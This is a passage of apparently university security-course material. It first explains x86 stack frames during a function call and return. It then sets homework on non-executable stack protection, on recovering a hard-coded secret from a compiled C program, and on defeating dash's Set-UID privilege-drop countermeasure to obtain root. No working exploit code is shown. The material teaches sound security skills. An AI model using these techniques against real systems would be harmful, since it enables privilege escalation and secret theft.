Figure 1(c).
• Line 11: subl $8, %esp: The stack pointer is modified to allocate space (8 bytes) for local
variables and the two arguments passed to printf. Since there is no local variable in function foo,
the 8 bytes are for arguments only. See Figure 1(d).

#### 4.3 Leaving foo()

Now the control has passed to the function foo(). Let us see what happens to the stack when the function
returns.
• Line 16: leave: This instruction implicitly performs two instructions (it was a macro in earlier x86
releases, but was made into an instruction later):
mov %ebp, %esp
pop %ebp
The first statement releases the stack space allocated for the function; the second statement recovers
the previous frame pointer. The current stack is depicted in Figure 1(e).
• Line 17: ret: This instruction simply pops the return address out of the stack, and then jump to the
return address. The current stack is depicted in Figure 1(f).
• Line 32: addl $4, %esp: Further restore the stack by releasing more memories allocated for
foo. As you can see that the stack is now in exactly the same state as it was before entering the
function foo (i.e., before line 28).


## 3.3 NX (10 pts)
In this course, I have introduced a defensive mechanism called non-executable
stack. I also told you that the only difference between NX enabled and
NX disabled programs is one bit. Actually, this defensive mechanism is im-
plemented on CPU. Please check that if this defensive approach still works
when NX is disabled in BIOS. Also you need to check if the malicious code
is in heap, will the attack work?

## 3.4 Password Guess (20 pts)
Please read the following code.
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

int main()
{
    FILE *pFile = fopen("/dev/random", "rb");

    uint32_t guess = 0, secret = 0;

    if (pFile == NULL)
    {
        perror("Error");
        return 0;
    }

    fread(&secret, 4, 1, pFile);

    while (1)
    {
        printf("Please enter your guess: ");
        scanf("%u", &guess);

        if (guess == secret)
        {
            break;
        }

        printf("Wrong guess! Please guess again.\n");
    }

    printf("Congratulation! The secret is uiwebqwhec12!\n");

    return 0;
}
```
I think you should know the function of this code. Please write a lab
to show how to get the secret from binary only. Note that in your lab, you
need to show at least four ways to get the secret. I give you this code so
that you can build the code yourself. Undoubtedly, read the code directly
is not included.



## 3.5 Defeat DASH Countermeasure (20 pts)
In this class, I have introduced how DASH protect your system from Set-
UID programs. Now we want to beat this countermeasure. The concept is
very simple. We can use setuid to set all process-related user ID’s to the
input uid. The problem is, the root uid is 0 and you all know that strcpy()
stops when encountering zero. How to solve this problem? Please write
down your idea and launch your attack to show it works.
Of course, you can use any approaches. For your convenience, I will
give you one hint.
1 // The functions sprintf () writes a formatted string (
including the terminating null byte ('\0')) to str.
2 int sprintf (char *str , const char *format , ...);
